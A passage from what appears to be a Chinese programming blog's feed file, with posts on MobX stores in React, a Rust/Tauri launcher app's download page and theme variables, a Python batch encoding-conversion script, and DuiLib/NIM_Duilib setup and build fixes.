&#125; <span class="keyword">from</span> <span class="string">&#x27;mobx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CounterStore</span> &#123;</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">makeAutoObservable</span>(<span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  addCount = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">  &#125;</span><br><span class="line">  changeList = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">push</span>(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  get filterList () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item &gt; <span class="number">4</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> counter = <span class="keyword">new</span> <span class="title class_">CounterStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> counter</span><br></pre></td></tr></table></figure><h2 id="3、组合模块导出统一方法"><a href="#3、组合模块导出统一方法" class="headerlink" title="3、组合模块导出统一方法"></a>3、组合模块导出统一方法</h2><p><strong>store&#x2F;index.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> counter <span class="keyword">from</span> <span class="string">&#x27;./counterStore&#x27;</span></span><br><span class="line"><span class="keyword">import</span> task <span class="keyword">from</span> <span class="string">&#x27;./taskStore&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RootStore</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">counterStore</span> = counter</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">taskStore</span> = task</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rootStore = <span class="keyword">new</span> <span class="title class_">RootStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// context机制的数据查找链  Provider如果找不到 就找createContext方法执行时传入的参数</span></span><br><span class="line"><span class="keyword">const</span> context = <span class="title class_">React</span>.<span class="title function_">createContext</span>(rootStore)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">useStore</span> = (<span class="params"></span>) =&gt; <span class="title class_">React</span>.<span class="title function_">useContext</span>(context)</span><br><span class="line"><span class="comment">// useStore() =&gt;  rootStore  &#123; counterStore, taskStore &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; useStore &#125;</span><br></pre></td></tr></table></figure><h2 id="4、组件使用模块中的数据"><a href="#4、组件使用模块中的数据" class="headerlink" title="4、组件使用模块中的数据"></a>4、组件使用模块中的数据</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; observer &#125; <span class="keyword">from</span> <span class="string">&#x27;mobx-react-lite&#x27;</span></span><br><span class="line"><span class="comment">// 导入方法</span></span><br><span class="line"><span class="keyword">import</span> &#123; useStore &#125; <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 得到store</span></span><br><span class="line">  <span class="keyword">const</span> store = <span class="title function_">useStore</span>()</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> store.counterStore.addCount()&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        &#123;store.counterStore.count&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 包裹组件让视图响应数据变化</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">observer</span>(<span class="title class_">App</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快捷启动</title>
      <link href="/bd0cdd8be799/"/>
      <url>/bd0cdd8be799/</url>
      
        <content type="html"><![CDATA[<p style="color: red;"><b>本页面为本人所制作软件下载页面，外传请标注来源。请勿修改本人软件版权，尊重他人劳动成果！谢谢！</b></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在写这款软件之前，一直使用的别人的软件。总体来说还是不错的，但是这段时间学习了Rust语言，所以决定自己写一款相同的软件。并且准备加上一些定制化内容，所以这款软件就诞生了。</p><h1 id="技术要点"><a href="#技术要点" class="headerlink" title="技术要点"></a>技术要点</h1><ol><li>Rust语言 - 核心功能编写</li><li>C++语言 - 动态库编写</li><li>Vue3 - 界面UI编写</li><li>Tauri框架 - 一款以WebView2为UI的跨平台框架</li><li>anyhow&#x2F;thiserror - 异常处理</li><li>tracing - 日志库</li><li>Windows COM - 解析lnk文件</li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li>本软件所启动的进程权限与当前软件权限一致，例如：QuickStart为管理员模式，则它所启动的进程也是管理员模式</li><li>主题所使用的网络图片必须采用https方式，本地图标需放在软件同级目录下的cache&#x2F;background中</li><li>软件当前不支持拖拽文件快捷添加，需要右键通过文件选择器打开。</li><li>主题编写时需要遵守YAML文件规范，主题所有属性均支持CSS属性。</li><li>当样式需要携带#号时，请使用双引号将值引起来。例如：”–query-input-border-color”: “1px solid #36ad6a”</li><li>待补充</li></ol><h1 id="快捷键介绍"><a href="#快捷键介绍" class="headerlink" title="快捷键介绍"></a>快捷键介绍</h1><ol><li>Alt + 1 默认控制程序显示隐藏功能（可以通过设置页面更改）</li><li>Ctrl + F 快捷打开搜索栏</li><li>ESC 快捷关闭搜索栏</li><li>方向键上下快捷控制搜索栏结果选择项</li><li>回车键快捷打开搜索栏选中项进程（需要配和方向键使用）</li></ol><h1 id="使用小技巧"><a href="#使用小技巧" class="headerlink" title="使用小技巧"></a>使用小技巧</h1><ol><li>添加目录后，可以对目录设置启动参数，即可改变启动方式。仅支持一个启动参数。<br>示例: 使用VSCode打开目录，注意需要将VSCode的路径添加到系统的Path环境变量中。通过如下设置即可单击通过VSCode打开改目录。<br><img src="/../uploads/2022/10/2913751638.png" alt="2022-10-13T08:36:57.png" title="2022-10-13T08:36:57.png"></li><li>可以替换{你的程序所在路径}\cache\icons\folder.ico的图标，更改默认文件夹图标</li></ol><h1 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h1><p><strong>主题文件存放目录：</strong>{你的程序所在路径}\cache\themes</p><h2 id="主题示例"><a href="#主题示例" class="headerlink" title="主题示例"></a>主题示例</h2><ol><li>default.yml 默认主题<br><img src="/../uploads/2022/10/3988336165.png" alt="2022-10-13T08:16:10.png" title="2022-10-13T08:16:10.png"></li><li>桔梗.yml 使用联网图片例子<br><img src="/../uploads/2022/10/1760840870.png" alt="2022-10-13T08:16:39.png" title="2022-10-13T08:16:39.png"></li><li>犬夜叉.yml 使用本地图片例子<br><img src="/../uploads/2022/10/3460441818.png" alt="2022-10-13T08:17:03.png" title="2022-10-13T08:17:03.png"></li></ol><h2 id="主题样式介绍"><a href="#主题样式介绍" class="headerlink" title="主题样式介绍"></a>主题样式介绍</h2><h3 id="主窗口"><a href="#主窗口" class="headerlink" title="主窗口"></a>主窗口</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>–main-wnd-bg</td><td>背景设置，支持图片</td></tr><tr><td>–main-wnd-bg-size</td><td>背景图片大小</td></tr><tr><td>–main-wnd-opacity</td><td>背景图片透明度</td></tr><tr><td>–main-wnd-blur</td><td>背景图片模糊度</td></tr><tr><td>–main-title-box-bg-color</td><td>标题栏背景色，不支持图片</td></tr><tr><td>–main-title-box-title-color</td><td>标题栏字体颜色</td></tr><tr><td>–main-title-box-control-btn-bg-color</td><td>标题栏控制按钮鼠标悬浮时背景颜色</td></tr><tr><td>–main-menu-box-bg-color</td><td>左侧菜单背景色，不支持图片</td></tr><tr><td>–el-menu-text-color</td><td>左侧菜单字体颜色</td></tr><tr><td>–el-menu-hover-text-color</td><td>左侧菜单鼠标悬浮时字体颜色</td></tr><tr><td>–el-menu-bg-color</td><td>左侧菜单条目背景色，推荐设置为transparent，使用–main-menu-box-bg-color整体颜色</td></tr><tr><td>–el-menu-hover-bg-color</td><td>左侧菜单条目鼠标悬浮时背景色</td></tr><tr><td>–el-menu-active-color</td><td>左侧菜单条目选中时字体颜色</td></tr><tr><td>–main-content-box-bg-color</td><td>内容区域背景色，不支持图片</td></tr><tr><td>–app-item-hover-border</td><td>应用条目鼠标悬浮时边框颜色</td></tr><tr><td>–app-item-name-color</td><td>应用名称字体颜色</td></tr><tr><td>–app-item-description-color</td><td>应用描述文本字体颜色</td></tr></tbody></table><h3 id="搜索栏"><a href="#搜索栏" class="headerlink" title="搜索栏"></a>搜索栏</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>–query-dropdown-background</td><td>背景色，不支持图片</td></tr><tr><td>–query-input-background</td><td>搜索框背景色，不支持图片</td></tr><tr><td>–query-input-color</td><td>搜索框字体颜色</td></tr><tr><td>–query-input-caret-color</td><td>搜索框光标颜色</td></tr><tr><td>–query-input-placeholder</td><td>搜索框默认提示文本颜色</td></tr><tr><td>–query-input-border-color</td><td>搜索框边框颜色</td></tr><tr><td>–query-input-hover-border-color</td><td>搜索框鼠标悬浮时边框颜色</td></tr><tr><td>–query-input-focus-border-color</td><td>搜索框获得焦点时边框颜色</td></tr><tr><td>–query-input-focus-box-shadow</td><td>搜索框获得焦点时阴影色</td></tr><tr><td>–query-dropdown-divider-background-color</td><td>分隔符颜色</td></tr><tr><td>–app-query-item-color</td><td>搜索结果条目字体颜色</td></tr><tr><td>–app-query-item-background</td><td>搜索结果条目背景色</td></tr><tr><td>–app-query-item-hover-background</td><td>搜索结果条目鼠标悬浮时背景颜色，不支持图片</td></tr><tr><td>–app-query-item-selected-background</td><td>搜索结果条目选中时背景颜色，不支持图片</td></tr></tbody></table><h3 id="设置窗口"><a href="#设置窗口" class="headerlink" title="设置窗口"></a>设置窗口</h3><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>–settings-wnd-bg</td><td>背景设置，支持图片</td></tr><tr><td>–settings-wnd-bg-size</td><td>背景图片尺寸</td></tr><tr><td>–settings-wnd-opacity</td><td>背景图片透明度</td></tr><tr><td>–settings-wnd-blur</td><td>背景图片模糊度</td></tr><tr><td>–settings-title-box-bg-color</td><td>标题栏背景颜色，不支持图片</td></tr><tr><td>–settings-title-box-title-color</td><td>标题栏字体颜色</td></tr><tr><td>–settings-title-box-control-btn-hover-bg-color</td><td>标题栏控制按钮鼠标悬浮时背景颜色，不支持图片</td></tr><tr><td>–settings-content-box-bg-color</td><td>内容区域背景色，不支持图片</td></tr><tr><td>–settings-check-btn-bg-color</td><td>内容区域Check按钮背景色，不支持图片</td></tr><tr><td>–settings-check-btn-border</td><td>内容区域Check按钮边框色</td></tr></tbody></table><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="https://www.lanzoui.com/ihwNw0gha02b">https://www.lanzoui.com/ihwNw0gha02b</a></p><h1 id="问题反馈"><a href="#问题反馈" class="headerlink" title="问题反馈"></a>问题反馈</h1><p>如果你使用本软件过程中遇见了什么BUG，请通过博客留言反馈给我。并且携带logs文件夹下的日志文件。</p>]]></content>
      
      
      <categories>
          
          <category> 应用下载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QuickStart </tag>
            
            <tag> 快捷启动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NIM_Duilib设置透明窗口</title>
      <link href="/06651e4f0047/"/>
      <url>/06651e4f0047/</url>
      
        <content type="html"><![CDATA[<p>在网易版本的duilib，如果需要透明窗口。则需要将Window标签的shadowattached属性设置为false。</p><h1 id="shadowattached属性"><a href="#shadowattached属性" class="headerlink" title="shadowattached属性"></a>shadowattached属性</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Attribute</span> <span class="attr">name</span>=<span class="string">&quot;shadowattached&quot;</span> <span class="attr">default</span>=<span class="string">&quot;true&quot;</span> <span class="attr">type</span>=<span class="string">&quot;BOOL&quot;</span> <span class="attr">comment</span>=<span class="string">&quot;窗口是否附加阴影效果,如(true)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>它是一个窗口的属性。其值及意义如下：</p><table><thead><tr><th>value</th><th>作用</th></tr></thead><tbody><tr><td>true</td><td>默认值，给窗口加上阴影背景</td></tr><tr><td>false</td><td>不会给窗口额外增加背景，此时窗体的背景为全透明</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> NIM_Duilib </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NIM_Duilib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 脚本 - 文件编码批量转换</title>
      <link href="/584dce545f37/"/>
      <url>/584dce545f37/</url>
      
        <content type="html"><![CDATA[<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_file</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">  <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(path):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">      <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.h&#x27;</span>):</span><br><span class="line">        fullname = os.path.join(root, f)</span><br><span class="line">        <span class="keyword">yield</span> fullname</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_coding</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = chardet.detect(f.read())</span><br><span class="line">  <span class="keyword">if</span> c[<span class="string">&#x27;encoding&#x27;</span>] != <span class="string">&#x27;UTF-8-SIG&#x27;</span>: <span class="comment"># 排除的编码格式</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改文件编码方式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_to_utf_file</span>(<span class="params">path: <span class="built_in">str</span></span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> find_all_file(path):</span><br><span class="line">    c = judge_coding(i)</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        change(i, c[<span class="string">&#x27;encoding&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[成功] &#123;&#125; 编码方式已从 &#123;&#125; 编码更改成功&quot;</span>.<span class="built_in">format</span>(i, c[<span class="string">&#x27;encoding&#x27;</span>]))</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[失败] &#123;&#125; 编码方式从 &#123;&#125; 编码更改失败&quot;</span>.<span class="built_in">format</span>(i, c[<span class="string">&#x27;encoding&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">path: <span class="built_in">str</span>, coding: <span class="built_in">str</span></span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>, encoding=coding) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有文件编码方式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">path: <span class="built_in">str</span></span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> find_all_file(path):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(i, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      <span class="built_in">print</span>(chardet.detect(f.read())[<span class="string">&#x27;encoding&#x27;</span>], <span class="string">&#x27;: &#x27;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  change_to_utf_file(<span class="string">&#x27;你的路径&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码格式批量转换 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NIM_Duilib的MessageLoopProxy重定义问题</title>
      <link href="/d6a1b08fb7f1/"/>
      <url>/d6a1b08fb7f1/</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在使用NIM_Duilib的时候，会发现跟demo用的同一个库，却提示编译不通过，报错为如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ui_components.lib(stdafx.obj) : error LNK2005: <span class="string">&quot;public: void __thiscall nbase::MessageLoopProxy::PostTaskAndReplyRelay&lt;void __cdecl(void),void __cdecl(void)&gt;::Run(void)&quot;</span> (?Run@?<span class="variable">$PostTaskAndReplyRelay</span>@$A6AXXZ<span class="variable">$A6AXXZ</span>@MessageLoopProxy@nbase@@QAEXXZ) 已经在 pch.obj 中定义</span><br></pre></td></tr></table></figure><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>将C&#x2F;C++的语言选项中的符合模式关闭即可。<br><img src="/../uploads/2022/09/3925807348.png" alt="2022-09-16T07:56:48.png" title="2022-09-16T07:56:48.png"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> NIM_Duilib </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MessageLoopProxy </tag>
            
            <tag> NIM_Duilib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DuiLib_Ultimate项目搭建</title>
      <link href="/ad874e1f5092/"/>
      <url>/ad874e1f5092/</url>
      
        <content type="html"><![CDATA[<h1 id="下载DuiLib-Ultimate库"><a href="#下载DuiLib-Ultimate库" class="headerlink" title="下载DuiLib_Ultimate库"></a>下载DuiLib_Ultimate库</h1><hr><p>库链接：<a href="https://github.com/qdtroy/DuiLib_Ultimate">https://github.com/qdtroy/DuiLib_Ultimate</a></p><p>下载后目录结构如下：<br><img src="/../uploads/2022/08/2695297916.png" alt="2022-08-30T09:21:23.png" title="2022-08-30T09:21:23.png"></p><h1 id="编译生成库文件"><a href="#编译生成库文件" class="headerlink" title="编译生成库文件"></a>编译生成库文件</h1><hr><p>注意：本文只介绍静态库版本，动态库请看下方作者教程  </p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=91754477&bvid=BV1d7411N7jz&cid=156671827&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"> </iframe></div><h2 id="升级项目"><a href="#升级项目" class="headerlink" title="升级项目"></a>升级项目</h2><p>打开项目后提示需要升级，那么这里点击确认即可<br><img src="/../uploads/2022/08/851273774.png" alt="2022-08-30T09:22:41.png" title="2022-08-30T09:22:41.png"><br>升级完成后，项目结构如下图所示<br><img src="/../uploads/2022/08/3473144202.png" alt="2022-08-30T09:23:21.png" title="2022-08-30T09:23:21.png"></p><h2 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h2><p>该项目有很多种编译方式，详情请看下表。</p><table><thead><tr><th>编译模式</th><th>描述</th></tr></thead><tbody><tr><td>Debug</td><td>使用 Unicode 字符集Debug模式动态库版本</td></tr><tr><td>DebugA</td><td>使用多字节字符集Debug模式动态库版本</td></tr><tr><td>Release</td><td>使用 Unicode 字符集Release模式动态库版本</td></tr><tr><td>ReleaseA</td><td>使用多字节字符集Release模式动态库版本</td></tr><tr><td>SDebug</td><td>使用 Unicode 字符集Debug模式静态库版本</td></tr><tr><td>SDebugA</td><td>使用多字节字符集Debug模式静态库版本</td></tr><tr><td>SRelease</td><td>使用 Unicode 字符集Release模式静态库版本</td></tr><tr><td>SReleaseA</td><td>使用多字节字符集Release模式静态库版本</td></tr></tbody></table><h2 id="编译-归类"><a href="#编译-归类" class="headerlink" title="编译&amp;归类"></a>编译&amp;归类</h2><p>我们将所有静态库版本均编译出来，并对其进行目录归类。</p><p>这里我们只演示一种，其余与之原理相同</p><ol><li>选择编译模式为SDebug，版本为Win32。<br><img src="/../uploads/2022/08/1913280634.png" alt="2022-08-30T09:37:27.png" title="2022-08-30T09:37:27.png"></li><li>点击重新生成，不出意外均会成功。出意外只能求助作者了，我编译过程中未发现问题。<br><img src="/../uploads/2022/08/516960384.png" alt="2022-08-30T09:39:27.png" title="2022-08-30T09:39:27.png"><br><img src="/../uploads/2022/08/3093367821.png" alt="2022-08-30T09:40:28.png" title="2022-08-30T09:40:28.png"></li><li>将编译好的文件放入<code>你选择的路径/Lib/x32/</code>下进行归类</li><li>编译其余所有版本并对齐进行归类…</li><li>最终目录结构如下<br><img src="/../uploads/2022/08/523286256.png" alt="2022-08-30T09:50:09.png" title="2022-08-30T09:50:09.png"><br><img src="/../uploads/2022/08/4152310875.png" alt="2022-08-30T09:50:22.png" title="2022-08-30T09:50:22.png"><br><img src="/../uploads/2022/08/2882627836.png" alt="2022-08-30T09:50:34.png" title="2022-08-30T09:50:34.png"></li></ol><h1 id="配置项目"><a href="#配置项目" class="headerlink" title="配置项目"></a>配置项目</h1><hr><h2 id="更改输出目录为-ProjectDir-bin-。"><a href="#更改输出目录为-ProjectDir-bin-。" class="headerlink" title="更改输出目录为:$(ProjectDir)..\bin\。"></a>更改输出目录为:<code>$(ProjectDir)..\bin\</code>。</h2><p><img src="/../uploads/2022/08/1136584111.png" alt="2022-08-30T09:57:21.png" title="2022-08-30T09:57:21.png"></p><h2 id="设置VC-目录中的包含目录和库目录"><a href="#设置VC-目录中的包含目录和库目录" class="headerlink" title="设置VC++目录中的包含目录和库目录"></a>设置VC++目录中的包含目录和库目录</h2><p>包含目录为<code>DuiLib_Ultimate-master</code>项目中的<code>DuiLib</code>文件目录。库目录为我们之前编译好的静态库存放目录<br><img src="/../uploads/2022/08/417085180.png" alt="2022-08-30T10:00:40.png" title="2022-08-30T10:00:40.png"><br><img src="/../uploads/2022/08/837422101.png" alt="2022-08-30T10:02:08.png" title="2022-08-30T10:02:08.png"><br>库目录我放在了<code>DuiLib_Ultimate-master</code>项目中的<code>Lib</code>文件夹中<br><img src="/../uploads/2022/08/447425776.png" alt="2022-08-30T10:02:47.png" title="2022-08-30T10:02:47.png"></p><h2 id="添加预编译宏"><a href="#添加预编译宏" class="headerlink" title="添加预编译宏"></a>添加预编译宏</h2><p>在预处理器中，添加宏<code>UILIB_STATIC</code>。<br><img src="/../uploads/2022/08/3821683997.png" alt="2022-08-30T10:03:55.png" title="2022-08-30T10:03:55.png"><br><img src="/../uploads/2022/08/3762131082.png" alt="2022-08-30T10:04:35.png" title="2022-08-30T10:04:35.png"><br><img src="/../uploads/2022/08/4188485358.png" alt="2022-08-30T10:05:28.png" title="2022-08-30T10:05:28.png"></p><h2 id="修改运行时库"><a href="#修改运行时库" class="headerlink" title="修改运行时库"></a>修改运行时库</h2><p><img src="/../uploads/2022/08/3264026431.png" alt="2022-08-31T02:30:17.png" title="2022-08-31T02:30:17.png"></p><p><img src="/../uploads/2022/08/3487826771.png" alt="2022-08-31T02:31:05.png" title="2022-08-31T02:31:05.png"></p><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><hr><h3 id="1-创建Windows-桌面向导"><a href="#1-创建Windows-桌面向导" class="headerlink" title="1. 创建Windows 桌面向导"></a>1. 创建Windows 桌面向导</h3><p><img src="/../uploads/2022/08/307548210.png" alt="2022-08-30T09:52:59.png" title="2022-08-30T09:52:59.png"></p><h3 id="2-项目名写成自己的就好"><a href="#2-项目名写成自己的就好" class="headerlink" title="2. 项目名写成自己的就好"></a>2. 项目名写成自己的就好</h3><p><img src="/../uploads/2022/08/1110691831.png" alt="2022-08-30T09:53:55.png" title="2022-08-30T09:53:55.png"></p><h3 id="3-选择桌面应用程序"><a href="#3-选择桌面应用程序" class="headerlink" title="3. 选择桌面应用程序"></a>3. 选择桌面应用程序</h3><p><img src="/../uploads/2022/08/656455196.png" alt="2022-08-30T09:54:24.png" title="2022-08-30T09:54:24.png"></p><h3 id="4-删除所有代码除了main函数"><a href="#4-删除所有代码除了main函数" class="headerlink" title="4. 删除所有代码除了main函数"></a>4. 删除所有代码除了main函数</h3><p><img src="/../uploads/2022/08/201395252.png" alt="2022-08-30T09:55:31.png" title="2022-08-30T09:55:31.png"></p><h3 id="5-在framework-h文件中添加项目环境"><a href="#5-在framework-h文件中添加项目环境" class="headerlink" title="5. 在framework.h文件中添加项目环境"></a>5. 在<code>framework.h</code>文件中添加项目环境</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 